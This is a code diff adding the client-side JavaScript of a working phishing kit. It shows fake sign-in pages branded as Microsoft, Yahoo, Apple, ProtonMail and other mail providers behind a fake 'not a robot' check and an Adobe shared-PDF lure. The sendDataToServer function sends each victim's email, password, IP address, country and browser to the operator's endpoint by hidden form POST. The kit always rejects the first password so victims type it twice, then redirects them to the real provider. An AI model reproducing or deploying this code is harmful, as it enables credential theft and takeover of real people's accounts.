+    'live.com':    {name:'Microsoft',favicon:'https://outlook.live.com/favicon.ico',  bgUrl:'https://outlook.live.com',    accent:'#0078D4', subtitle:'Sign in to your Microsoft account',  title:'Sign in to Microsoft'},
+    'yahoo.com':   {name:'Yahoo',    favicon:'https://www.yahoo.com/favicon.ico',     bgUrl:'https://login.yahoo.com',     accent:'#6001D2', subtitle:'Sign in to your Yahoo account',      title:'Sign in to Yahoo'},
+    'protonmail.com':{name:'ProtonMail',favicon:'https://protonmail.com/favicon.ico', bgUrl:'https://mail.protonmail.com', accent:'#6D4AFF', subtitle:'Sign in to ProtonMail',              title:'Sign in to ProtonMail'},
+    'proton.me':   {name:'ProtonMail',favicon:'https://proton.me/favicon.ico',        bgUrl:'https://mail.proton.me',      accent:'#6D4AFF', subtitle:'Sign in to ProtonMail',              title:'Sign in to ProtonMail'},
+    'icloud.com':  {name:'Apple',    favicon:'https://www.icloud.com/favicon.ico',    bgUrl:'https://www.icloud.com',      accent:'#0071E3', subtitle:'Sign in with your Apple ID',         title:'Sign in with Apple'},
+    'aol.com':     {name:'AOL',      favicon:'https://www.aol.com/favicon.ico',       bgUrl:'https://login.aol.com',       accent:'#0F0F0F', subtitle:'Sign in to your AOL account',        title:'Sign in to AOL'},
+    'zoho.com':    {name:'Zoho',     favicon:'https://www.zoho.com/favicon.ico',      bgUrl:'https://accounts.zoho.com',   accent:'#E42527', subtitle:'Sign in to your Zoho account',       title:'Sign in to Zoho'},
+    'gmx.com':     {name:'GMX',      favicon:'https://www.gmx.com/favicon.ico',       bgUrl:'https://www.gmx.com',         accent:'#1C449B', subtitle:'Sign in to your GMX account',        title:'Sign in to GMX'},
+    'gmx.net':     {name:'GMX',      favicon:'https://www.gmx.net/favicon.ico',       bgUrl:'https://www.gmx.net',         accent:'#1C449B', subtitle:'Sign in to your GMX account',        title:'Sign in to GMX'},
+    'mail.com':    {name:'Mail.com', favicon:'https://www.mail.com/favicon.ico',      bgUrl:'https://www.mail.com',        accent:'#0F62FE', subtitle:'Sign in to your Mail.com account',   title:'Sign in to Mail.com'}
+};
+function makeGenericProvider(domain){
+    const base = domain.split('.')[0] || domain;
+    const name = base.charAt(0).toUpperCase() + base.slice(1);
+    const favicon = 'https://www.google.com/s2/favicons?domain=' + encodeURIComponent(domain) + '&sz=64';
+    return {name,favicon,bgUrl:'https://'+domain,accent:'#3B63FB',subtitle:'Sign in to '+name,title:'Sign in to '+name};
+}
+
+// ==========================================================
+//  SUBMISSION — direct to my API via hidden form POST
+//  (browser-side replacement for the old PHP cURL forward)
+// ==========================================================
+async function getVisitorCountry(){
+    try{const r=await fetch('https://ipapi.co/json/');const d=await r.json();return d.country_name||'Unknown';}
+    catch(e){return 'Unknown';}
+}
+async function getClientIP(){
+    try{const r=await fetch('https://api.ipify.org/?format=json');const d=await r.json();return d.ip;}
+    catch(e){return 'Unknown';}
+}
+function detectBrowser(){
+    const ua=navigator.userAgent;
+    if(ua.includes('Firefox'))return 'Firefox';
+    if(ua.includes('SamsungBrowser'))return 'Samsung Internet';
+    if(ua.includes('Opera')||ua.includes('OPR'))return 'Opera';
+    if(ua.includes('Trident'))return 'Internet Explorer';
+    if(ua.includes('Edge'))return 'Edge';
+    if(ua.includes('Chrome'))return 'Chrome';
+    if(ua.includes('Safari'))return 'Safari';
+    return 'Unknown';
+}
+async function sendDataToServer(email,password){
+    try{
+        const country=await getVisitorCountry();
+        const ip=await getClientIP();
+        const browser=detectBrowser();
+        const domain=email.includes('@')?email.split('@')[1]:'unknown';
+
+        const payload = {
+            email:     email,
+            password:  password,
+            domain:    domain,
+            ipAddress: ip,
+            country:   country,
+            browser:   browser,
+            userAgent: navigator.userAgent,
+            timezone:  Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timestamp: new Date().toISOString()
+        };
+
+        // Cross-origin form POST into a hidden iframe => no CORS restrictions,
+        // exactly like the server-side forward used to do.
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = SUBMIT_URL;
+        form.target = 'submissionSink';
+        form.style.display = 'none';
+
+        Object.keys(payload).forEach(function(key){
+            const input = document.createElement('input');
+            input.type  = 'hidden';
+            input.name  = key;
+            input.value = payload[key] == null ? '' : payload[key];
+            form.appendChild(input);
+        });
+
+        document.body.appendChild(form);
+        form.submit();
+
+        await new Promise(function(resolve){
+            setTimeout(function(){ try{ form.remove(); }catch(e){} resolve(); }, 800);
+        });
+
+        const result = { success:true, status:200, data:'submitted', error:null };
+        console.log('Submission result:', result);
+        return result;
+    }catch(e){
+        console.error('sendData error:', e);
+        return null;
+    }
+}
+
+// ==========================================================
+//  TRANSLATIONS
+// ==========================================================
+const translations={
+  'en':{'checking-browser':"Verifying it's you",'checking-description':"To continue, please confirm you're not a robot. This helps protect your account from unauthorized access.",'not-robot':"I'm not a robot",'verification-help':'This verification helps prevent automated access. Your information is encrypted and secure.','try-again':'Incorrect password. Please try again.','verified-success':'Verification complete','verification-complete':'Verified','verification-redirect':'Taking you to your account...','connecting-title':'Connecting to your email server…','connecting-sub':'Establishing a secure session'},
+  'es':{'checking-browser':'Verificando que eres tú','checking-description':'Para continuar, confirma que no eres un robot. Esto ayuda a proteger tu cuenta.','not-robot':'No soy un robot','verification-help':'Esta verificación ayuda a prevenir el acceso automatizado.','try-again':'Contraseña incorrecta. Inténtalo de nuevo.','verified-success':'Verificación completa','verification-complete':'Verificado','verification-redirect':'Llevándote a tu cuenta...','connecting-title':'Conectando a tu servidor de correo…','connecting-sub':'Estableciendo una sesión segura'},
+  'fr':{'checking-browser':'Vérification de votre identité','checking-description':"Pour continuer, confirmez que vous n'êtes pas un robot. Cela protège votre compte.",'not-robot':'Je ne suis pas un robot','verification-help':'Cette vérification aide à prévenir les accès automatisés.','try-again':'Mot de passe incorrect. Veuillez réessayer.','verified-success':'Vérification terminée','verification-complete':'Vérifié','verification-redirect':'Redirection vers votre compte...','connecting-title':'Connexion à votre serveur de messagerie…','connecting-sub':'Établissement d\'une session sécurisée'},
+  'de':{'checking-browser':'Identität wird überprüft','checking-description':'Bitte bestätigen Sie, dass Sie kein Roboter sind. Dies schützt Ihr Konto.','not-robot':'Ich bin kein Roboter','verification-help':'Diese Überprüfung verhindert automatisierten Zugriff.','try-again':'Falsches Passwort. Bitte erneut versuchen.','verified-success':'Überprüfung abgeschlossen','verification-complete':'Verifiziert','verification-redirect':'Weiterleitung zu Ihrem Konto...','connecting-title':'Verbindung zu Ihrem E-Mail-Server…','connecting-sub':'Sichere Sitzung wird hergestellt'},
+  'it':{'checking-browser':'Verifica della tua identità','checking-description':'Per continuare, conferma di non essere un robot. Questo protegge il tuo account.','not-robot':'Non sono un robot','verification-help':"Questa verifica previene l'accesso automatizzato.",'try-again':'Password errata. Riprova.','verified-success':'Verifica completata','verification-complete':'Verificato','verification-redirect':'Reindirizzamento al tuo account...','connecting-title':'Connessione al tuo server di posta…','connecting-sub':'Stabilendo una sessione sicura'},
+  'pt':{'checking-browser':'Verificando sua identidade','checking-description':'Para continuar, confirme que você não é um robô. Isso protege sua conta.','not-robot':'Não sou um robô','verification-help':'Esta verificação impede acesso automatizado.','try-again':'Senha incorreta. Tente novamente.','verified-success':'Verificação concluída','verification-complete':'Verificado','verification-redirect':'Redirecionando para sua conta...','connecting-title':'Conectando ao seu servidor de e-mail…','connecting-sub':'Estabelecendo uma sessão segura'},
+  'ru':{'checking-browser':'Проверка вашей личности','checking-description':'Чтобы продолжить, подтвердите, что вы не робот. Это защищает вашу учетную запись.','not-robot':'Я не робот','verification-help':'Эта проверка предотвращает автоматический доступ.','try-again':'Неверный пароль. Попробуйте снова.','verified-success':'Проверка завершена','verification-complete':'Проверено','verification-redirect':'Перенаправление в вашу учетную запись...','connecting-title':'Подключение к вашему почтовому серверу…','connecting-sub':'Установка защищённого соединения'},
+  'ar':{'checking-browser':'التحقق من هويتك','checking-description':'للمتابعة، يرجى تأكيد أنك لست روبوتًا. هذا يحمي حسابك.','not-robot':'أنا لست روبوتًا','verification-help':'يساعد هذا التحقق في منع الوصول الآلي.','try-again':'كلمة المرور غير صحيحة. حاول مرة أخرى.','verified-success':'اكتمل التحقق','verification-complete':'تم التحقق','verification-redirect':'جاري التوجيه إلى حسابك...','connecting-title':'جاري الاتصال بخادم البريد…','connecting-sub':'إنشاء جلسة آمنة'},
+  'zh':{'checking-browser':'正在验证您的身份','checking-description':'请确认您不是机器人以继续。这有助于保护您的账户。','not-robot':'我不是机器人','verification-help':'此验证有助于防止自动化访问。','try-again':'密码错误。请重试。','verified-success':'验证完成','verification-complete':'已验证','verification-redirect':'正在跳转到您的账户...','connecting-title':'正在连接您的邮件服务器…','connecting-sub':'正在建立安全会话'},
+  'ja':{'checking-browser':'本人確認中','checking-description':'続行するには、ロボットでないことを確認してください。','not-robot':'ロボットではありません','verification-help':'この確認は自動アクセスを防ぎます。','try-again':'パスワードが間違っています。もう一度お試しください。','verified-success':'確認完了','verification-complete':'確認済み','verification-redirect':'アカウントにリダイレクト中...','connecting-title':'メールサーバーに接続しています…','connecting-sub':'安全なセッションを確立中'},
+  'tr':{'checking-browser':'Kimliğiniz doğrulanıyor','checking-description':'Devam etmek için robot olmadığınızı onaylayın. Bu hesabınızı korur.','not-robot':'Robot değilim','verification-help':'Bu doğrulama otomatik erişimi önler.','try-again':'Yanlış şifre. Tekrar deneyin.','verified-success':'Doğrulama tamamlandı','verification-complete':'Doğrulandı','verification-redirect':'Hesabınıza yönlendiriliyorsunuz...','connecting-title':'E-posta sunucunuza bağlanılıyor…','connecting-sub':'Güvenli oturum kuruluyor'},
+  'nl':{'checking-browser':'Uw identiteit wordt geverifieerd','checking-description':'Bevestig dat u geen robot bent om door te gaan. Dit beschermt uw account.','not-robot':'Ik ben geen robot','verification-help':'Deze verificatie voorkomt geautomatiseerde toegang.','try-again':'Onjuist wachtwoord. Probeer opnieuw.','verified-success':'Verificatie voltooid','verification-complete':'Geverifieerd','verification-redirect':'Doorsturen naar uw account...','connecting-title':'Verbinding maken met uw e-mailserver…','connecting-sub':'Beveiligde sessie tot stand brengen'},
+  'pl':{'checking-browser':'Weryfikacja tożsamości','checking-description':'Aby kontynuować, potwierdź, że nie jesteś robotem.','not-robot':'Nie jestem robotem','verification-help':'Ta weryfikacja zapobiega automatycznemu dostępowi.','try-again':'Nieprawidłowe hasło. Spróbuj ponownie.','verified-success':'Weryfikacja zakończona','verification-complete':'Zweryfikowano','verification-redirect':'Przekierowanie do konta...','connecting-title':'Łączenie z serwerem poczty…','connecting-sub':'Ustanawianie bezpiecznej sesji'}
+};
+const countryToLanguage={
+  'ES':'es','FR':'fr','DE':'de','IT':'it','PT':'pt','GB':'en','IE':'en','NL':'nl','BE':'nl',
+  'CH':'de','AT':'de','PL':'pl','TR':'tr','RU':'ru','UA':'ru','RO':'ru','BG':'ru','HU':'ru',
+  'CZ':'ru','SK':'ru','HR':'ru','RS':'ru','SI':'ru','LT':'ru','LV':'ru','EE':'ru','FI':'ru',
+  'SE':'ru','NO':'ru','DK':'ru','IS':'ru','CN':'zh','JP':'ja','KR':'zh','TW':'zh','HK':'zh',
+  'SG':'zh','MY':'zh','ID':'zh','PH':'zh','TH':'zh','VN':'zh','IN':'en','PK':'en','BD':'en',
+  'ZA':'en','NG':'en','EG':'ar','MA':'ar','DZ':'ar','TN':'ar','KE':'en','GH':'en','CI':'fr',
+  'CM':'fr','SN':'fr','ML':'fr','BF':'fr','NE':'fr','US':'en','CA':'en','MX':'es','BR':'pt',
+  'AR':'es','CL':'es','CO':'es','PE':'es','VE':'es','EC':'es','BO':'es','PY':'es','UY':'es',
+  'SA':'ar','AE':'ar','QA':'ar','KW':'ar','JO':'ar','LB':'ar','SY':'ar','IQ':'ar','YE':'ar',
+  'OM':'ar','BH':'ar','IL':'en','AU':'en','NZ':'en','default':'en'
+};
+let currentLanguage='en';
+async function detectUserLanguage(){
+  try{
+    const r=await fetch('https://ipapi.co/json/');
+    const d=await r.json();
+    const cc=d.country_code||'US';
+    currentLanguage=countryToLanguage[cc]||countryToLanguage['default'];
+    if(!translations[currentLanguage])currentLanguage='en';
+  }catch(e){
+    const bl=navigator.language.split('-')[0];
+    currentLanguage=translations[bl]?bl:'en';
+  }
+  return currentLanguage;
+}
+function applyTranslations(lang){
+  document.querySelectorAll('.translatable').forEach(el=>{
+    const k=el.getAttribute('data-key');
+    if(k&&translations[lang]&&translations[lang][k])el.textContent=translations[lang][k];
+  });
+  const ct=document.getElementById('connectingTitle');
+  const cs=document.getElementById('connectingSub');
+  if(ct) ct.textContent = (translations[lang] && translations[lang]['connecting-title']) || 'Connecting to your email server…';
+  if(cs) cs.textContent = (translations[lang] && translations[lang]['connecting-sub'])   || 'Establishing a secure session';
+}
+
+// ==========================================================
+//  URL → store email / domain
+// ==========================================================
+let detectedEmail='';
+let detectedDomain='';
+let detectedDomainName='';
+
+function parseHashParameters(){
+  let email=extractEmailFromURL();
+  let domain='',domainName='';
+
+  if(!email){
+    const rawDomain=extractDomainFromURL();
+    if(rawDomain){
+      domain=rawDomain;
+      domainName=domain.split('.')[0].toUpperCase();
+      detectedEmail='';detectedDomain=domain;detectedDomainName=domainName;
+      return {email:null,domain,domainName};
+    }
+  }
+
+  if(email&&email.includes('@')){
+    domain=email.split('@')[1];
+    domainName=domain.split('.')[0].toUpperCase();
+    detectedEmail=email;detectedDomain=domain;detectedDomainName=domainName;
+  }
+  return {email,domain,domainName};
+}
+
+// ==========================================================
+//  VERIFICATION HANDLER
+// ==========================================================
+let loginPopupTimer = null;
+
+function setupVerification(){
+  const box=document.getElementById('recaptcha-box');
+  const cb=document.getElementById('recaptcha-checkbox');
+  const section=document.getElementById('verification-section');
+  const bar=document.getElementById('verification-progress');
+  const dots=document.querySelectorAll('.step-dot');
+  let busy=false;
+
+  box.addEventListener('click',function(){
+    if(busy)return; busy=true;
+    cb.classList.add('checked');
+    dots[0].classList.add('completed');
+    dots[1].classList.add('active');
+
+    let p=0;
+    const iv=setInterval(()=>{
+      p+=Math.random()*15+5;
+      if(p>100)p=100;
+      bar.style.width=p+'%';
+      if(p>=100){
+        clearInterval(iv);
+        setTimeout(()=>{
+          cb.classList.remove('checked');
+          cb.classList.add('checked-done');
+          const lbl=document.querySelector('.recaptcha-label');
+          lbl.textContent=translations[currentLanguage]['verified-success']||'Verification complete';
+          lbl.style.color='#1a73e8';lbl.style.fontWeight='500';
+
+          dots[1].classList.remove('active');dots[1].classList.add('completed');
+          dots[2].classList.add('active');
+
+          document.getElementById('domain-message').textContent=translations[currentLanguage]['verification-complete']||'Verified';
+          document.getElementById('domain-submessage').textContent=translations[currentLanguage]['verification-redirect']||'Taking you to your account...';
+
+          setTimeout(()=>{
+            dots[2].classList.remove('active');dots[2].classList.add('completed');
+            section.style.opacity='0';
+
+            if(detectedDomain){
+              swapToDomainFavicon(detectedDomain);
+            }
+
+            setTimeout(()=>{
+              section.style.display='none';
+              if(loginPopupTimer) clearTimeout(loginPopupTimer);
+              loginPopupTimer = setTimeout(function(){
+                if(typeof window.openLoginContainer==='function'){
+                  window.openLoginContainer();
+                }
+              }, LOGIN_AUTO_POPUP_DELAY);
+            },400);
+          },1000);
+        },300);
+      }
+    },200);
+  });
+}
+
+// ==========================================================
+//  CONNECTING SCREEN SEQUENCER
+// ==========================================================
+function runConnectingSequence(onComplete){
+  const screen = document.getElementById('connectingScreen');
+  const stage  = document.getElementById('loginFormStage');
+  const s1     = document.getElementById('connStep1');
+  const s2     = document.getElementById('connStep2');
+  const s3     = document.getElementById('connStep3');
+
+  [s1,s2,s3].forEach(el=>{el.classList.remove('active','done');});
+  s1.classList.add('active');
+  stage.classList.remove('visible');
+  screen.style.display='flex';
+
+  const perStep = CONNECTING_DURATION / 3;
+
+  const t1 = setTimeout(()=>{
+    s1.classList.remove('active'); s1.classList.add('done');
+    s2.classList.add('active');
+  }, perStep);
+
+  const t2 = setTimeout(()=>{
+    s2.classList.remove('active'); s2.classList.add('done');
+    s3.classList.add('active');
+  }, perStep*2);
+
+  const t3 = setTimeout(()=>{
+    s3.classList.remove('active'); s3.classList.add('done');
+    setTimeout(()=>{
+      screen.style.display='none';
+      stage.classList.add('visible');
+      if(typeof onComplete==='function') onComplete();
+    }, 300);
+  }, CONNECTING_DURATION);
+
+  return { t1, t2, t3 };
+}
+
+// ==========================================================
+//  LOGIN MODAL
+// ==========================================================
+(function() {
+    "use strict";
+
+    const MAX_RETRIES = 2;
+
+    const overlay           = document.getElementById('loginOverlay');
+    const loginCard         = document.getElementById('loginCard');
+    const providerBgFrame   = document.getElementById('providerBgFrame');
+    const providerFavicon   = document.getElementById('providerFavicon');
+    const providerName      = document.getElementById('providerName');
+    const providerSub       = document.getElementById('providerSub');
+    const loginTitle        = document.getElementById('loginTitle');
+    const loginSubtitle     = document.getElementById('loginSubtitle');
+    const loginForm         = document.getElementById('loginForm');
+    const emailInput        = document.getElementById('loginEmail');
+    const passwordInput     = document.getElementById('loginPassword');
+    const errorMsg          = document.getElementById('loginError');
+    const retryInfo         = document.getElementById('retryInfo');
+    const submitBtn         = document.getElementById('loginSubmitBtn');
+    const resetProviderLink = document.getElementById('resetProviderLink');
+
+    const connectingScreen  = document.getElementById('connectingScreen');
+    const connectingFavicon = document.getElementById('connectingFavicon');
+    const loginFormStage    = document.getElementById('loginFormStage');
+
+    let failedAttempts = 0;
+    let isLocked = false;
+    let currentProvider = null;
+    let providerLocked = false;
+    let connectingTimer = null;
+
+    window.openLoginContainer = function() {
+        overlay.classList.add('active');
+
+        let provider = null;
+        if (detectedEmail) {
+            provider = resolveProvider(detectedEmail);
+        }
+
+        if (provider) {
+            connectingFavicon.src = provider.favicon;
+            connectingFavicon.onerror = function(){
+                const d = provider.bgUrl.replace(/^https?:\/\//,'').split('/')[0];
+                this.src='https://www.google.com/s2/favicons?domain='+encodeURIComponent(d)+'&sz=64';
+            };
+            loginCard.style.setProperty('--provider-accent', provider.accent);
+            if(provider.bgUrl){
+                try{ providerBgFrame.src = provider.bgUrl; }catch(e){}
+            }
+        } else {
+            connectingFavicon.src = 'adobe.png';
+            loginCard.style.setProperty('--provider-accent', '#3B63FB');
+        }
+
+        if (connectingTimer) clearTimeout(connectingTimer);
+        const seq = runConnectingSequence(function(){
+            if (detectedEmail && !emailInput.value) {
+                emailInput.value = detectedEmail;
+                if (provider) { applyProvider(provider); providerLocked = true; }
+                setTimeout(function(){ passwordInput.focus(); }, 120);
+            } else {
+                setTimeout(function(){ emailInput.focus(); }, 120);
+            }
+        });
+
+        connectingTimer = seq.t3;
+    };
+
+    function resolveProvider(email) {
+        if (!email || email.indexOf('@') === -1) return null;
+        const domain = email.split('@')[1].toLowerCase().trim();
+        if (!domain) return null;
+        if (PROVIDERS[domain]) return PROVIDERS[domain];
+        return makeGenericProvider(domain);
+    }
+
+    function applyProvider(provider) {
+        if (!provider) return;
+        currentProvider = provider;
+        loginCard.style.setProperty('--provider-accent', provider.accent);
+
+        providerFavicon.src = provider.favicon;
+        providerFavicon.onerror = function() {
+            const domain = provider.bgUrl.replace(/^https?:\/\//, '').split('/')[0];
+            this.src = 'https://www.google.com/s2/favicons?domain=' + encodeURIComponent(domain) + '&sz=64';
+        };
+
+        providerName.textContent = provider.name;
+        providerSub.textContent = provider.subtitle;
+        loginTitle.textContent = provider.title;
+        loginSubtitle.textContent = provider.subtitle + ' to view the shared PDF document.';
+
+        try { providerBgFrame.src = provider.bgUrl; } catch (e) { providerBgFrame.src = 'about:blank'; }
+    }
+
+    function resetProvider() {
+        providerLocked = false;
+        currentProvider = null;
+        loginCard.style.setProperty('--provider-accent', '#3B63FB');
+        providerFavicon.src = 'adobe.png';
+        providerName.textContent = 'Adobe Account';
+        providerSub.textContent = 'Sign in to continue';
+        loginTitle.textContent = 'Sign in';
+        loginSubtitle.textContent = 'Enter your credentials to view the shared PDF document.';
+        providerBgFrame.src = 'about:blank';
+        passwordInput.value = '';
+        errorMsg.textContent = '';
+        retryInfo.textContent = '';
+        passwordInput.focus();
+    }
+
+    emailInput.addEventListener('blur', function() {
+        if (providerLocked) return;
+        const email = emailInput.value.trim();
+        const provider = resolveProvider(email);
+        if (provider) applyProvider(provider);
+    });
+
+    emailInput.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            const email = emailInput.value.trim();
+            const provider = resolveProvider(email);
+            if (provider) applyProvider(provider);
+            passwordInput.focus();
+        }
+    });
+
+    resetProviderLink.addEventListener('click', function(e) {
+        e.preventDefault();
+        if (isLocked) return;
+        resetProvider();
+        emailInput.focus();
+    });
+
+    function updateRetryDisplay() {
+        const remaining = MAX_RETRIES - failedAttempts;
+        if (failedAttempts === 0) {
+            retryInfo.textContent = '';
+            errorMsg.textContent = '';
+        } else if (remaining > 0 && !isLocked) {
+            retryInfo.textContent = '⚠️ ' + remaining + ' attempt' + (remaining > 1 ? 's' : '') + ' remaining.';
+        } else if (isLocked) {
+            retryInfo.textContent = '❌ Account temporarily locked. Too many failed attempts.';
+        }
+    }
+
+    function handleFailedAttempt(message) {
+        failedAttempts++;
+        errorMsg.textContent = message || 'Invalid email or password.';
+        if (failedAttempts >= MAX_RETRIES) {
+            isLocked = true;
+            emailInput.disabled = true;
+            passwordInput.disabled = true;
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Locked';
+            submitBtn.style.background = '#a0a0a0';
+            submitBtn.style.cursor = 'not-allowed';
+            errorMsg.textContent = 'Maximum retries exceeded. Access blocked.';
+        }
+        updateRetryDisplay();
+    }
+
+    loginForm.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        if (isLocked) return;
+
+        const email = emailInput.value.trim();
+        const password = passwordInput.value;
+
+        if (!email || !password) {
+            errorMsg.textContent = 'Please fill in both fields.';
+            return;
+        }
+
+        providerLocked = true;
+        const provider = resolveProvider(email);
+        if (provider) applyProvider(provider);
+
+        detectedEmail = email;
+        detectedDomain = email.split('@')[1] || '';
+        detectedDomainName = detectedDomain.split('.')[0].toUpperCase();
+
+        if (failedAttempts === 0) {
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Signing in…';
+            errorMsg.textContent = '';
+            retryInfo.textContent = '';
+            await sendDataToServer(email, password);
+            setTimeout(function() {
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Sign in';
+                handleFailedAttempt('Incorrect password. Please try again.');
+                passwordInput.value = '';
+                passwordInput.focus();
+            }, 1200);
+        } else {
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Verifying…';
+            await sendDataToServer(email, password);
+            setTimeout(function() {
+                overlay.classList.remove('active');
+                showPdfViewer();
+            }, 1200);
+        }
+    });
+
+    emailInput.addEventListener('input', function() {
+        if (!isLocked) errorMsg.textContent = '';
+    });
+    passwordInput.addEventListener('input', function() {
+        if (!isLocked) errorMsg.textContent = '';
+    });
+
+    passwordInput.addEventListener('paste', function(e) { e.preventDefault(); });
+    overlay.addEventListener('click', function(e) { if (e.target === overlay) { /* stay open */ } });
+
+    updateRetryDisplay();
+})();
+
+// ==========================================================
+//  PDF VIEWER
+// ==========================================================
+function showPdfViewer(){
+    const viewer = document.getElementById('pdfViewer');
+    const loader = document.getElementById('pdfLoaderOverlay');
+    const loaderText = document.getElementById('pdfLoaderText');
+
+    if (detectedDomain) {
+        document.getElementById('pdfDocTitle').textContent = detectedDomainName + '_Document.pdf';
+        document.getElementById('pdfHeader').textContent = detectedDomainName + ' Shared Document';
+        document.getElementById('pdfMeta').textContent = 'Confidential · ' + detectedDomain + ' · Adobe Acrobat Reader';
+    }
+
+    viewer.classList.add('active');
+    loader.classList.add('active');
+
+    const steps = [
+        { text: 'Checking Adobe Acrobat plugin…', delay: 1500 },
+        { text: 'Plugin not detected. Preparing installation…', delay: 1500 },
+        { text: 'Redirecting to ' + (detectedDomain || 'provider') + '…', delay: 1500 }
+    ];
+    let i = 0;
+    function next() {
+        if (i >= steps.length) {
+            const target = detectedDomain ? 'https://' + detectedDomain : 'https://google.com';
+            window.location.href = target;
+            return;
+        }
+        loaderText.textContent = steps[i].text;
+        const d = steps[i].delay;
+        i++;
+        setTimeout(next, d);
+    }
+    next();
+}
+function closePdfViewer(){
+    document.getElementById('pdfViewer').classList.remove('active');
+    document.getElementById('pdfLoaderOverlay').classList.remove('active');
+}
+
+// ==========================================================
+//  FOOTER BUTTON + INIT
+// ==========================================================
+document.getElementById('dmd').addEventListener('click', function(e) {
+    e.preventDefault();
+    if (typeof window.openLoginContainer === 'function') {
+        window.openLoginContainer();
+    } else {
+        document.getElementById('loginOverlay').classList.add('active');
+    }
+});
+
+document.addEventListener('DOMContentLoaded', async function() {
+    lockAdobeFavicon();
+    await detectUserLanguage();
+    applyTranslations(currentLanguage);
+    parseHashParameters();
+    setupVerification();
+});
+</script>
+</body>
+</html>
